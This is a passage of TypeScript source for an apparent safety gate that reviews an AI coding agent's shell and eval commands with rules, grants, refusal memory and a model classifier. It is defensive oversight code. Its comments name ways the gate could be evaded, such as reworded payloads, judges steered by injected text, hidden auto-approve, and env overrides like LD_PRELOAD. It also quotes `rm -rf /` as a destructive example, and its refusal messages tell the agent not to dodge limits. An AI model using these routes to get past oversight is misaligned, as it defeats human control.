			const declaredCwd = spawn.kind === "literal" ? spawn.cwd : undefined;
			const cwd = declaredCwd ?? ctx.cwd;
			// Rides every line this call writes, so an audit reader can tell a
			// directory the payload declared from the session's without going
			// back to the payload text — which the `cmd` field truncates.
			const spawnField = declaredCwd === undefined ? {} : { spawnCwd: declaredCwd };
			// Over-bound spawn-bearing code is blocked unseen, like bash: no
			// classifier or dialog may approve text it did not read.
			if (evalCode.length > config.maxCommandLength) {
				const why =
					`eval code blocked: ${evalCode.length} chars exceeds the ` +
					`${config.maxCommandLength}-character review limit`;
				const replay = replayDecision({ tool: "eval", command: evalCode, cwd, maxCommandLength: config.maxCommandLength, headless: !ctx.hasUI });
				logDecisionFor(ctx, { tool: "eval", decision: "block", layer: replay.layer, why, cmd: evalCode, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields(), ...spawnField });
				addRefusal(ctx, evalCode, why, { source: "cap", cwd });
				return {
					block: true,
					reason: refusalPayload(
						"eval",
						"cap",
						why,
						"Move the long code into a file and eval a short cell that reads it.",
						"Do not shorten the code only to dodge the limit.",
						{ chars: String(evalCode.length), limit: String(config.maxCommandLength) },
					),
				};
			}
			const target = { command: evalCode, cwd, envKeys: [], pty: false, timeout: undefined as number | undefined, async: false, ...spawnField };
			// A spawn directory this scan could not read is not a reason to
			// classify anyway: a payload judged against a directory it does not
			// run in was judged on the wrong question, and a verdict earned that
			// way is worth less than a human's answer. Ask, and say what could
			// not be read — the code text on the dialog carries the rest.
			if (spawn.kind === "opaque") {
				const headline = EVAL_SPAWN_CWD_HEADLINE;
				// No `spawnCwd` on these lines: the whole reason this path exists
				// is that no directory could be read from the payload.
				logDecisionFor(ctx, {
					tool: "eval",
					decision: "block",
					layer: "cwd",
					why: `${headline}: ${spawn.why}`,
					cmd: evalCode,
					cwd,
					verdict: null,
					cached: 0,
					ms: Date.now() - started,
					...auditFields(),
				});
				return await requestPermission(ctx, target, headline, spawn.why, "eval", "", userScopeFingerprint, auditFields());
			}
			const scoped = sessionCache(ctx.sessionManager.getSessionId());
			// Judge identity is the model selector plus the question battery: a
			// verdict earned under one policy must not be reused under another.
			// (The config signature clears the whole cache when either changes;
			// this keeps the key honest on its own.) Both directories are in the
			// key: the spawn's own, which is where the judged command runs, and
			// the session's, which is where the payload's own process still runs
			// and reads and writes. Dropping either would let a verdict cross a
			// directory change it never saw. The measured worktree geometry
			// rides here as it does on the bash path (issue #69 slice C): the
			// judge read it off this cwd, so a worktree registered, removed, or
			// detached between calls must invalidate the verdict; the measured
			// ref state (slice D) and network tier (issue #65) ride with it too.
			// Push provenance is a bash-path measurement: this payload is not a
			// shell command.
			const worktreeProvenanceForCache = measureGitWorktreeProvenance(cwd);
			const refProvenanceForCache = measureGitRefProvenance(evalCode, cwd);
			const networkProvenanceForCache = measureNetworkProvenance(evalCode, cwd);
			const cacheKey = JSON.stringify([
				"eval", config.typesafeModel, judgeBackendFor(config.judgeBackend).id, CLASSIFIER_POLICY_HASH, cwd, ctx.cwd, language, evalCode, reviewEvidenceFingerprint,
				worktreeProvenanceForCache ?? null,
				refProvenanceForCache ?? null,
				networkProvenanceForCache ?? null,
			]);
			// Session grant (issue #32): same user-tier authorization as the bash
			// path — "Allow for session" on this payload's dialog promised the
			// session off, so it must hold here too, not only for bash. The
			// session directory rides along: the grant identity is the pair the
			// judge's cache key uses, so the payload's relative work in ctx.cwd
			// is authorized only in the workspace the human was shown.
			if (matchingGrant(ctx, normalizeEvalGrantTarget(evalCode), cwd, userScopeFingerprint, ctx.cwd)) {
				const replay = replayDecision({ tool: "eval", command: evalCode, cwd, grant: "session" });
				if (replay.decision === "allow") {
					logDecisionFor(ctx, { tool: "eval", decision: "allow", layer: replay.layer, why: "session grant", cmd: evalCode, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields(), ...spawnField });
					return;
				}
			}
			const cached = scoped.get(cacheKey);
			if (dryRun && !cached) {
				const replay = replayDecision({ tool: "eval", command: evalCode, cwd, judgement: undefined, headless: !ctx.hasUI });
				return dryRunStop({
					would: "classify",
					layer: "classifier",
					why: `${replay.why}; model classification would run here`,
					note: "the classifier model would run here; skipped in dry-run",
				});
			}
			// Refusal memory (issue #30): a reworded payload meets its session's
			// prior refusal. The record tells the model; the SAFE branch below
			// stops trusting a bare SAFE for a refused target.
			const prior = priorRefusalFor(ctx, evalCode, cwd, reviewEvidenceFingerprint);
			const recordExtras: Record<string, unknown> = {
				// The judge is told which directory the payload named for itself,
				// because `cwd` arrives as the working directory and a spawn's own
				// directory is a second fact about the same payload.
				...spawnField,
				...(prior ? { priorRefusal: { target: prior.normalizedTarget, why: prior.why, when: new Date(prior.ts).toISOString() } } : {}),
			};
			try {
				let classifyError = "";
				const judgement = cached ? withoutShadow(cached) : (await classify(ctx, evalCode, cwd, config.timeoutMs, { kind: "eval-code", language, ...recordExtras }, reviewOperatorContext, evidenceSnapshot, "code").catch(
					(err: unknown) => {
						classifyError = err instanceof Error ? err.message : String(err);
						pi.logger.warn(`classifier: classify failed: ${classifyError}`);
						return undefined;
					},
				));
				if (!judgement) {
					return await requestPermission(ctx, target, "unclassified", classifyError ? `classifier unavailable: ${truncated(classifyError, 160)}` : "classifier unavailable", "eval", "", userScopeFingerprint, { ...auditFields(), ...spawnField });
				}
				if (!cached && judgement.verdict !== "UNAVAILABLE" && !judgement.noCache) remember(scoped, cacheKey, judgement);
				const logCode = truncated(evalCode.replace(/\s+/gu, " ").trim(), 120);
				if (!dryRun) pi.logger.info(
					`classifier: verdict=${judgement.verdict}` +
						` tool=eval lang=${language || "?"} cached=${cached ? 1 : 0} reason="${judgement.reason}" code="${logCode}"`,
				);
				if (judgement.verdict === "SAFE") {
					// Assignment positions name variables, not commands: the
					// `const rm = Bun.spawnSync(...)` shape flagged "rm" and
					// dialoged a SAFE the judge reached on the visible spawn.
					// A real destructive verb reads as a call or an argument
					// (`rm -rf`, spawn(["rm", …])) and never as `token =`.
					const flagList = evalRiskFlags(evalCode);
					const replay = replayDecision({
						tool: "eval",
						command: evalCode,
						cwd,
						judgement,
						priorRefusal: Boolean(prior),
						riskFlags: flagList,
						headless: !ctx.hasUI,
					});
					if (replay.decision === "allow") {
						// Fresh SAFE auto-run logs layer "verdict"; a replayed cached
						// verdict logs "cached" — provenance, same allow.
						logDecisionFor(ctx, { tool: "eval", decision: "allow", layer: cached ? "cached" : "verdict", why: judgement.reason, cmd: evalCode, cwd, verdict: "SAFE", cached: cached ? 1 : 0, ms: Date.now() - started, ...(judgement.modelId ? { modelId: judgement.modelId } : {}), ...(judgement.reasonCode ? { reasonCode: judgement.reasonCode } : {}), ...(judgement.jev ? { jev: judgement.jev } : {}), ...auditFields(), ...judgementAudit(judgement), ...spawnField });
						return;
					}
					// A SAFE on a target this session already refused is not a
					// clean bill: the refusal rode in the state the judge saw, so a
					// SAFE means the command looks safe, not that the refusal was
					// wrong. The prior refusal stands until a human says otherwise,
					// and the moderate-risk overlay keeps its own reason when both
					// hit.
					const why =
						flagList.length > 0
							? `classifier-safe but flags: ${flagList.join(", ")}`
							: replay.why;
					logDecisionFor(ctx, { tool: "eval", decision: "block", layer: "verdict", why, cmd: evalCode, cwd, verdict: "SAFE", cached: cached ? 1 : 0, ms: Date.now() - started, ...(judgement.modelId ? { modelId: judgement.modelId } : {}), ...(judgement.reasonCode ? { reasonCode: judgement.reasonCode } : {}), ...(judgement.jev ? { jev: judgement.jev } : {}), ...auditFields(), ...judgementAudit(judgement), ...spawnField });
					return await requestPermission(ctx, target, "flagged for approval", why, "eval", flagList.length > 0 ? "follows verdict" : "despite prior refusal", userScopeFingerprint, { ...auditFields(), ...judgementAudit(judgement), ...spawnField });
				}
				const detail =
					judgement.verdict === "UNSAFE"
						? "classified unsafe"
						: judgement.verdict === "UNAVAILABLE"
							? "classifier unavailable"
							: "classifier unsure";
				// Two lines on purpose: the verdict itself, then requestPermission's
				// dialog/headless outcome prefixed "follows verdict".
				logDecisionFor(ctx, {
					tool: "eval",
					decision: "block",
					layer: "verdict",
					why: `${detail}: ${judgement.reason}`,
					cmd: evalCode,
					cwd,
					verdict: judgement.verdict,
					cached: cached ? 1 : 0,
					ms: Date.now() - started,
					...(judgement.modelId ? { modelId: judgement.modelId } : {}),
					...(judgement.reasonCode ? { reasonCode: judgement.reasonCode } : {}),
					...(judgement.jev ? { jev: judgement.jev } : {}),
					...auditFields(),
					...judgementAudit(judgement),
					...spawnField,
				});
				// A refusal record (issue #30) needs a verdict that judged the
				// content, and with Jev that means UNSAFE outright: UNSURE is
				// undecided, and UNAVAILABLE judged nothing at all (a transport
				// failure is not evidence about the command). Only a human denial
				// makes an undecided command a refusal — requestPermission
				// records that itself.
				if (judgement.verdict === "UNSAFE" && judgement.persistRefusal !== false) {
					addRefusal(ctx, evalCode, judgement.reason, { source: "model", cwd, evidenceFingerprint: reviewEvidenceFingerprint });
				}
				// The dialog is offered the still-running judgment, with the guards
				// a late SAFE would still have to clear (see GuardedLateJudgement): the
				// same `prior` and spawn-scan flags the SAFE branch above judges with,
				// and the spawn cwd the payload declared (issue #14).
				return await requestPermission(
					ctx,
					target,
					detail,
					judgement.reason,
					"eval",
					"follows verdict",
					userScopeFingerprint,
					{ ...auditFields(), ...judgementAudit(judgement), ...spawnField },
					judgement.late === undefined
						? undefined
						: { handle: judgement.late, priorRefusal: prior, riskFlags: evalRiskFlags(evalCode) },
				);
			} catch (err) {
				pi.logger.error(`classifier: ${err instanceof Error ? err.message : String(err)}`);
				logDecisionFor(ctx, { tool: "eval", decision: "block", layer: "internal-error", why: "classifier failed; eval code not run", cmd: evalCode, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields(), ...spawnField });
				return {
					block: true,
					reason: refusalPayload(
						"eval",
						"internal-error",
						"classifier failed; eval code not run",
						"Retry the command; if it keeps failing, check the plugin's error line in the OMP log.",
						"Do not treat the command as reviewed or approved.",
					),
				};
			}
		}

		// Universal bound, before every static-rule/critical/env branch: neither
		// the classifier nor a permission dialog may approve unseen suffix text.
		if (command.length > config.maxCommandLength) {
			const why =
				`bash command blocked: ${command.length} chars exceeds the ` +
				`${config.maxCommandLength}-character review limit`;
			const replay = replayDecision({ tool: "bash", command, cwd: ctx.cwd, maxCommandLength: config.maxCommandLength, headless: !ctx.hasUI });
			logDecisionFor(ctx, { tool: "bash", decision: "block", layer: replay.layer, why, cmd: command, cwd: ctx.cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
				addRefusal(ctx, command, why, { source: "cap", cwd: ctx.cwd });
			return {
				block: true,
				reason: refusalPayload(
					"bash",
					"cap",
					why,
					"Write long text to a file and reference it (e.g. git commit -F <file>), or split the command into steps.",
					"Do not shorten the message only to dodge the limit.",
					{ chars: String(command.length), limit: String(config.maxCommandLength) },
				),
			};
		}

		try {
			const policy = readHostPolicy();
			// Strip a leading literal `cd <path> &&` before matching allow rules,
			// mirroring native cwd extraction (bash.ts extracts it for cwd only).
			// Fail-closed: extractLeadingCdTarget returns null for $(...), $var,
			// unterminated quotes, or any non-`&&` join. `||`, not `??`: a
			// degenerate empty rest must fall back to the full command.
			const ruleCommand = extractLeadingCdTarget(command)?.rest || command;

			// Whole-command allow matching can never fire on a compound line:
			// shell control bails every allow rule, so `git status && git push`
			// always fell through to the classifier no matter how narrow the
			// rules were. Resolve compounds per segment instead, mirroring the
			// host's deny/prompt compound precedence: a deny/prompt on any
			// segment wins; an allow on every segment runs silent; a compound
			// with no deny/prompt decision and an undecided segment classifies.
			// Strip standalone `2>&1` for MATCHING only: it is an inert fd-dup
			// (moves no data), and the host tokenizer splits on its `&`, which
			// would otherwise shatter every diagnostic compound into unmatched
			// fragments. Writes (`> file`) and substitutions keep their
			// control characters and still bar a segment.
			const matchCommand =
				ruleCommand.replace(/(^|\s)2>&1(?=\s|$)/g, "").trim() || ruleCommand;
			const segments = bashCommandSegments(matchCommand);
			let rule: BashApprovalPatternRule | undefined;
			if (segments.length <= 1) {
				rule = policy.rules.find(candidate => bashApprovalRuleMatches(matchCommand, candidate));
			} else {
				const decisions = segments.map(segment =>
					policy.rules.find(candidate =>
						candidate.approval === "allow"
							? !isBlanketPattern(candidate.match) &&
								!hasBashApprovalShellControl(segment) &&
								commandMatchesBashApprovalPattern(segment, candidate.match)
							: commandSegmentMatchesBashApprovalPattern(segment, candidate.match),
					),
				);
				// Native compound semantics: a deny/prompt on any segment
				// decides the call — the host prompts on exactly this shape,
				// so adopt the rule even when sibling segments are undecided.
				// Classifying here too produced a double prompt on compound
				// force-pushes: the plugin's UNSAFE dialog, then the native
				// gate prompting the same command. Only a compound with NO
				// deny/prompt decision and an undecided segment classifies.
				rule =
					decisions.find(decision => decision?.approval === "deny") ??
					decisions.find(decision => decision?.approval === "prompt") ??
					(decisions.every(decision => decision !== undefined)
						? {
								match: "(every compound segment matches an allow rule)",
								approval: "allow",
							}
						: undefined);
			}

			// A deny rule is the one decision that outranks everything natively
			// (tools/bash.ts:557) — the host blocks the call, nothing to add.
			if (rule?.approval === "deny" || policy.bashPolicy === "deny") {
				const replay = replayDecision({ tool: "bash", command, cwd: ctx.cwd, staticRule: "deny", headless: !ctx.hasUI });
				if (dryRun) {
					return dryRunStop({
						would: "allow",
						layer: replay.layer,
						why: rule ? `rule: ${rule.match}` : "tools.approval.bash: deny",
						note: "host-native deny decides before this gate; the command never classifies",
					});
				}
				return;
			}

			// Native bash extracts a bare leading `cd <path> && …` when no
			// structured cwd was supplied, then resolves cwd with resolveToCwd
			// (bash.ts:969-979, 1035). Empty string is also \"not supplied\" to
			// native (`if (!cwd)`), so choose the extracted path with `||`, not
			// nullish coalescing.
			const rawCwd = typeof event.input.cwd === "string" ? event.input.cwd : undefined;
			const leadingCd = rawCwd ? null : extractLeadingCdTarget(command);
			const cwdInput = rawCwd || leadingCd?.path;
			// Native expands these protocol URLs using session-only router state
			// that ExtensionContext does not expose. Passing the raw URL to
			// resolveToCwd would mislabel it; skipping the gate would fail open.
			if (cwdInput?.includes("://") || cwdInput?.includes("local:/")) {
				logDecisionFor(ctx, { tool: "bash", decision: "block", layer: "cwd", why: "classifier cannot resolve an internal-URL cwd; command not run", cmd: command, cwd: cwdInput ?? ctx.cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
				return {
					block: true,
					reason: refusalPayload(
						"bash",
						"cwd",
						"classifier cannot resolve an internal-URL cwd; command not run",
						"Resolve the internal URL to a filesystem path and retry.",
						"Do not rewrite the URL (e.g. strip the scheme) to fake a filesystem path.",
					),
				};
			}
			const cwd = cwdInput ? resolveToCwd(cwdInput, ctx.cwd) : ctx.cwd;
			// Issue #67: a command that runs a script file is judged by what the
			// file HOLDS, not by its path. The body joins the text every layer
			// below reads — critical patterns, the forced-dialog token scan, the
			// verdict cache, the grants, the judge — so `python3 x.py` and
			// `python3 /tmp/x.py` reach the same verdict, and a rename changes
			// nothing. A body the classifier cannot read in full (over the review
			// limit, unreadable, truncated, expanded by the shell before the
			// interpreter sees it) fails closed here, before any static rule,
			// grant, or dialog could approve text nobody read.
			// The reader is handed the directory the command STARTS in, not the
			// one the host extracted a leading `cd X &&` into: the reader applies
			// the command's own `cd` chain itself, segment by segment, so a `cd`
			// the host never strips (`cd /tmp; python3 payload.py`) still decides
			// where payload.py is read from (issue #67 review round 1). Every
			// other walker that re-reads the command's `cd` chain — the two
			// provenance measurements below and inside `classify` — takes the
			// same pairing, and for the same reason: handing them `cwd`, the
			// directory the host's own extraction already moved to, applies the
			// extracted `cd` a second time (round 4 review).
			const startCwd = rawCwd ? resolveToCwd(rawCwd, ctx.cwd) : ctx.cwd;
			const script = readInterpretedScriptBodies(command, startCwd, config.maxCommandLength);
			if (script.refusal) {
				const why = script.refusal.why;
				logDecisionFor(ctx, { tool: "bash", decision: "block", layer: "script-body", why, cmd: command, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
				addRefusal(ctx, command, why, { source: "cap", cwd });
				return {
					block: true,
					reason: refusalPayload(
						"bash",
						"script-body",
						why,
						"Run the script's steps as individual commands, or keep the file inside the review limit and readable.",
						"Do not rename, move or shrink the script to dodge the read.",
					),
				};
			}
			const judgedCommand = script.text;
			const env = canonicalEnv(event.input.env);
			const pty = event.input.pty === true;
			const timeout = typeof event.input.timeout === "number" ? event.input.timeout : undefined;
			const async = event.input.async === true;
			const target = {
				command: judgedCommand,
				cwd,
				envKeys: env.keys,
				pty,
				timeout,
				async,
			};
			const scoped = sessionCache(ctx.sessionManager.getSessionId());
			// Every execution-affecting input is part of the identity. JSON avoids
			// collisions when a value contains whichever delimiter text we choose.
			// Judge identity is the model selector plus the question battery: a
			// verdict earned under one policy must not be reused under another.
			// (The config signature clears the whole cache when either changes;
			// this keeps the key honest on its own.) The judged text includes its
			// spliced script bodies, so a rewrite is a different question. Every
			// measured tier the judge reads must ride here too: a ref move, a
			// worktree change, or a destination that stops being this machine's
			// own invalidates the cached verdict. Push and network measurements
			// take the command's own start directory with unmodified text; the
			// walkers apply its `cd` chain themselves, matching `classify`.
			const pushProvenanceForCache = measureGitPushProvenance(judgedCommand, startCwd);
			const worktreeProvenanceForCache = measureGitWorktreeProvenance(cwd);
			const refProvenanceForCache = measureGitRefProvenance(judgedCommand, cwd);
			const networkProvenanceForCache = measureNetworkProvenance(judgedCommand, startCwd);
			const cacheKey = JSON.stringify([
				config.typesafeModel, judgeBackendFor(config.judgeBackend).id, CLASSIFIER_POLICY_HASH, cwd, env.key, pty, timeout, async, judgedCommand,
				reviewEvidenceFingerprint,
				pushProvenanceForCache ?? null,
				worktreeProvenanceForCache ?? null,
				refProvenanceForCache ?? null,
				networkProvenanceForCache ?? null,
			]);
			// Refusal memory (issue #30): a reworded command meets its session's
			// prior refusal. The record tells the model; the SAFE branch below
			// stops trusting a bare SAFE for a refused target. Computed before
			// the cache lookup so a cached SAFE cannot outvote a newer refusal.
			const prior = priorRefusalFor(ctx, judgedCommand, cwd, reviewEvidenceFingerprint);
			const recordExtras: Record<string, unknown> = prior
				? { priorRefusal: { target: prior.normalizedTarget, why: prior.why, when: new Date(prior.ts).toISOString() } }
				: {};

			// Native precedence is deny > CRITICAL > allow > prompt
			// (tools/bash.ts:557-577): a critical hit OUTRANKS an allow or prompt
			// rule and returns `override` with no policy, which `yolo` drops
			// (tools/approval.ts:156-171). So a command matching both a `prompt`
			// rule and a critical pattern — `rm -rf /` under `rm -rf * -> prompt` —
			// is auto-approved by the host with no dialog at all. This check must
			// therefore run BEFORE the allow/prompt exemptions below, and in every
			// approval mode: the mode cannot be trusted to imply a human, because
			// a per-session `autoApprove` (wrapper.ts:189-192) forces `yolo`
			// without appearing in settings at all.
			if (CRITICAL_BASH_PATTERNS.some(pattern => pattern.test(judgedCommand))) {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd, riskFlags: ["critical"], headless: !ctx.hasUI });
				logDecisionFor(ctx, { tool: "bash", decision: "block", layer: replay.layer, why: "critical pattern: matches a built-in dangerous-command pattern", cmd: judgedCommand, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
				// A critical hit is a refusal (issue #30) however the dialog below
				// ends: the pattern itself is the memory. An approval lifts it via
				// requestPermission.
				addRefusal(ctx, judgedCommand, "matches a built-in dangerous-command pattern", { source: "critical", cwd });
				return await requestPermission(
					ctx,
					target,
					"critical pattern",
					"matches a built-in dangerous-command pattern",
					"bash",
					"",
					userScopeFingerprint,
					auditFields(),
				);
			}

			// An `env` override selects which program runs (`PATH`, `BASH_ENV`,
			// `LD_PRELOAD`, `GIT_PAGER`). It therefore outranks a static
			// prompt/narrow-allow rule that only judged the command string. Env
			// values are not shown to the classifier — they can hold secrets.
			if (env.key !== "") {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd, envKeys: env.keys, headless: !ctx.hasUI });
				logDecisionFor(ctx, { tool: "bash", decision: "block", layer: replay.layer, why: "environment override: command runs with caller-supplied env; not classified", cmd: judgedCommand, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
				return await requestPermission(
					ctx,
					target,
					"environment override",
					"command runs with caller-supplied env; not classified",
					"bash",
					"",
					userScopeFingerprint,
					auditFields(),
				);
			}

			// Not critical and no env override: the host's static pattern
			// decisions still win. A pattern rule's policy outranks a non-deny
			// `tools.approval.bash` policy in native resolveApproval, so apply the
			// user prompt only when no pattern rule decided the call.
			if (rule?.approval === "prompt") {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd: ctx.cwd, staticRule: "prompt", headless: !ctx.hasUI });
				if (dryRun) {
					return dryRunStop({
						would: "allow",
						layer: replay.layer,
						why: `rule: ${rule.match}`,
						note: "host-native prompt rule prompts before this gate; the gate does not classify",
					});
				}
				return;
			}
			// A host allow rule matched the command TEXT the user wrote it for.
			// When a script body was read (#67) that text is not the text the gate
			// is judging: the file decides what runs, and its contents change per
			// call. The rule can say nothing about the file, so the call classifies
			// as if no rule had matched.
			if (rule?.approval === "allow" && !isBlanketPattern(rule.match) && script.bodies.length === 0) {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd, staticRule: "allow", headless: !ctx.hasUI });
				logDecisionFor(ctx, { tool: "bash", decision: "allow", layer: replay.layer, why: `rule: ${rule.match}`, cmd: judgedCommand, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
				return;
			}
			if (!rule && policy.bashPolicy === "prompt") {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd: ctx.cwd, staticRule: "prompt", headless: !ctx.hasUI });
				if (dryRun) {
					return dryRunStop({
						would: "allow",
						layer: replay.layer,
						why: "tools.approval.bash: prompt",
						note: "host-native approval policy prompts before this gate; the gate does not classify",
					});
				}
				return;
			}

			// Classify every remaining command in every approval mode. The host
			// has a per-session `autoApprove` flag that forces yolo without
			// exposing itself through settings (wrapper.ts:189-192); reconstructing
			// whether a human will appear from settings can therefore fail open.
			// In write/always-ask this costs a model call before the native prompt,
			// but never lets an invisible autoApprove bypass this gate.
			// enabled=false turns OFF model classification only; the critical and
			// env checks above, and static rule handling, stay enforced. A
			// per-session `/classifier off` pause gates exactly the same layer,
			// scoped to the session; global disabled dominates, so it keeps the
			// config layer when both hold.
			if (!config.enabled) {
				if (dryRun) {
					return dryRunStop({
						would: "allow",
						layer: "config",
						why: "classification is disabled (/classifier enabled false)",
						note: "critical, env, and static-rule checks stay active; no gate decision for this command",
					});
				}
				return;
			}
			if (sessionOff.has(ctx.sessionManager.getSessionId())) {
				if (dryRun) {
					return dryRunStop({
						would: "allow",
						layer: "session",
						why: "classification is paused for this session (/classifier off)",
						note: "critical, env, and static-rule checks stay active; no gate decision for this command",
					});
				}
				return;
			}

			// Session grant (issue #32): the user already approved this action for
			// this directory for the rest of the session. A grant is user-tier
			// authorization: it outranks model classification AND the refusal
			// memory (creating it lifts the target's refusals), but sits below the
			// critical-pattern and env-override checks above, which rank the
			// command itself, and below host static rules, which were configured
			// explicitly.
			// A grant is authorization for the text the human approved. The judged
			// text carries the script bodies (#67), so a grant recorded for one
			// body never covers a rewrite of that file: grantKeyForCommand sees the
			// spliced newlines and falls back to its exact-text key.
			if (matchingGrant(ctx, grantKeyForCommand(judgedCommand), cwd, userScopeFingerprint)) {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd, grant: "session" });
				if (replay.decision === "allow") {
					logDecisionFor(ctx, { tool: "bash", decision: "allow", layer: replay.layer, why: "session grant", cmd: judgedCommand, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
					return;
				}
			}
			// Persistent grant ("Always allow"): the user consented to this EXACT
			// command text from this directory, across sessions, for 30 days.
			// Same user-tier position as the session grant above — below the
			// critical-pattern, env-override, and static-rule checks (a grant
			// never bypasses those), above model classification, the verdict
			// cache, and refusal memory: a live grant mutes refusal memory for
			// its exact shape on purpose, because the human outvoted the model.
			// Unlike the session grant, the key is the whole command text
			// (compounds included — host static rules never match a
			// multi-segment command, so `cd X && script` could otherwise never be
			// remembered), which also means an env-prefixed spelling, a different
			// cwd, or any edit to the text intentionally does NOT match.
			if (matchingPersistentGrant(judgedCommand, cwd)) {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd, grant: "persistent" });
				if (replay.decision === "allow") {
					logDecisionFor(ctx, { tool: "bash", decision: "allow", layer: replay.layer, why: "persistent grant", cmd: judgedCommand, cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
					return;
				}
			}

			const cached = scoped.get(cacheKey);
			// Evidence is part of the key (evidenceFingerprint): a hit means
			// the identical evidence window produced this verdict, so no
			// hit-time revalidation is needed and dry-run stays read-only.
			// Dry-run probe (issue #32): with nothing cached, the classifier model
			// would run — report that instead of paying the call.
			if (dryRun && !cached) {
				const replay = replayDecision({ tool: "bash", command: judgedCommand, cwd, judgement: undefined, priorRefusal: Boolean(prior), headless: !ctx.hasUI });
				return dryRunStop({
					would: "classify",
					layer: "classifier",
					why: `${replay.why}; model classification would run here`,
					note: "the classifier model would run here; skipped in dry-run",
				});
			}
			let classifyError = "";
			const judgement = cached ? withoutShadow(cached) : (await classify(ctx, judgedCommand, cwd, config.timeoutMs, recordExtras, reviewOperatorContext, evidenceSnapshot, "shell", startCwd).catch((err: unknown) => {
				// Provider errors (quota exhausted, auth, HTTP failures) previously
				// vanished into an opaque "unavailable". Keep the message so the
				// permission dialog says WHY.
				classifyError = err instanceof Error ? err.message : String(err);
				pi.logger.warn(`classifier: classify failed: ${classifyError}`);
				return undefined;
			}));
			if (!judgement) {
				// Classifier unavailable/timed out. Ask rather than silently run.
				return await requestPermission(
					ctx,
					target,
					"unclassified",
					classifyError ? `classifier unavailable: ${truncated(classifyError, 160)}` : "classifier unavailable",
					"bash",
					"",
					undefined,
					auditFields(),
				);
			}
			// A failed request is a transient failure, not a policy: do NOT
			// cache it, or one outage pins the session to repeated prompts. Every
			// real verdict caches (including UNSURE, whose cached entry keeps a
			// nondeterministic judge from flapping verdicts); UNAVAILABLE sets
			// noCache for the same reason.
			if (!cached && judgement.verdict !== "UNAVAILABLE" && !judgement.noCache) remember(scoped, cacheKey, judgement);
			// Every resolved decision is logged so prompt/auto-run behavior is
			// observable from ~/.omp/logs without watching dialogs. Verdict,
			// the cache/reason provenance, and a truncated command; the full
			// command is not echoed (it can carry secrets in flags) and what is
			// echoed is redacted first, so a token inside the first 120
			// characters does not reach the log file. This is the choke point for
			// both the SAFE auto-run and the prompt path, and it feeds the issue
			// #2 eval corpus. A backslash-newline splice is joined before the
			// redactor looks at the text, because redact.ts redacts line by
			// line: a `--password` value on the continued line is otherwise on a
			// marker-less line of its own, and flattening it back onto the flag
			// would strand the real value after the REDACTED marker.
			const logCommand = truncated(redactSecrets(judgedCommand.replace(/\\\r?\n/gu, "")).replace(/\s+/gu, " ").trim(), 120);
			if (!dryRun) pi.logger.info(
				`classifier: verdict=${judgement.verdict}` +
					` cached=${cached ? 1 : 0} reason="${judgement.reason}" cmd="${logCommand}"`,
			);

			if (judgement.verdict === "SAFE") {
				// SAFE verdicts still hit a permission request when the command
				// carries a destructive/irreversible token. Jev reads the command
				// as untrusted state and can still be steered by text inside it,
				// and a judge that answers SAFE on a payload carrying an injected
				// instruction must not auto-run rm/dd/mkfs-class commands the
				// builtin critical list does not cover.
				const flags = matchModerateRiskTokens(judgedCommand, cwd);
				// Issue #67: a script body is code the classifier read verbatim —
				// the same class of payload as an inline `-c` argument — so the
				// same second-execution markers apply. A SAFE cannot vouch for a
				// script that re-execs or decodes its real work, and that must not
				// depend on the judge noticing which file it is reading.
				for (const body of script.bodies) {
					if (INTERPRETER_CODE_RISK.test(body.body)) flags.push(`${body.verb} runs ${body.operand}`);
				}
				const replay = replayDecision({
					tool: "bash",
					command: judgedCommand,
					cwd,
					judgement,
					priorRefusal: Boolean(prior),
					riskFlags: flags,
					headless: !ctx.hasUI,
				});
				if (replay.decision === "allow") {
					logDecisionFor(ctx, { tool: "bash", decision: "allow", layer: cached ? "cached" : "verdict", why: judgement.reason, cmd: judgedCommand, cwd, verdict: "SAFE", cached: cached ? 1 : 0, ms: Date.now() - started, ...(judgement.modelId ? { modelId: judgement.modelId } : {}), ...(judgement.reasonCode ? { reasonCode: judgement.reasonCode } : {}), ...(judgement.jev ? { jev: judgement.jev } : {}), ...auditFields(), ...judgementAudit(judgement) });
					return;
				}
				// A SAFE on a target this session already refused is not a clean
				// bill: the refusal rode in the state the judge saw, so a SAFE
				// means the command looks safe, not that the refusal was wrong.
				// The prior refusal stands until a human says otherwise, and the
				// moderate-risk overlay keeps its own reason when both hit.
				const priorTarget = prior?.normalizedTarget ?? "";
				const why =
					flags.length > 0
						? `classifier-safe but flags: ${flags.join(", ")}`
						: `classifier-safe despite prior refusal of "${priorTarget}"`;
				const foot = trashFootnote(flags);
				const dialogWhy = foot === "" ? why : `${why}\n${foot}`;
				logDecisionFor(ctx, { tool: "bash", decision: "block", layer: "verdict", why, cmd: judgedCommand, cwd, verdict: "SAFE", cached: cached ? 1 : 0, ms: Date.now() - started, ...(judgement.modelId ? { modelId: judgement.modelId } : {}), ...(judgement.reasonCode ? { reasonCode: judgement.reasonCode } : {}), ...(judgement.jev ? { jev: judgement.jev } : {}), ...auditFields(), ...judgementAudit(judgement) });
				return await requestPermission(
					ctx,
					target,
					"flagged for approval",
					dialogWhy,
					"bash",
					flags.length > 0 ? "follows verdict" : "despite prior refusal",
					userScopeFingerprint,
					{ ...auditFields(), ...judgementAudit(judgement) },
				);
			}
			const verdict = judgement.verdict;
			const detail =
				verdict === "UNSAFE"
					? "classified unsafe"
					: verdict === "UNAVAILABLE"
						? "classifier unavailable"
						: "classifier unsure";
			logDecisionFor(ctx, {
				tool: "bash",
				decision: "block",
				layer: "verdict",
